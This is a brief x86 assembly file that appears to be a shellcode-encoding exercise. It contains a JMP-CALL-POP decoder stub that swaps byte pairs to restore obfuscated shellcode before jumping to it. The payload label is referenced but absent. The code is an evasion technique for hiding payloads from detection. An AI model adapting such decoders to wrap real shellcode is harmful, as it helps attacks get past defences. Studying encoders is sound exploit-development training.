global _start

section .text
_start:

        jmp short call_decoder

decoder:
        pop esi
        xor ecx, ecx
	xor ebx, ebx
        mov cl, 26

decode:
	mov bl, byte [esi + 1]
	mov bh, byte [esi]

	mov byte [esi], bl
	mov byte [esi +1], bh	

	add esi, 2	

        loop decode

        jmp short Shellcode


call_decoder:

        call decoder

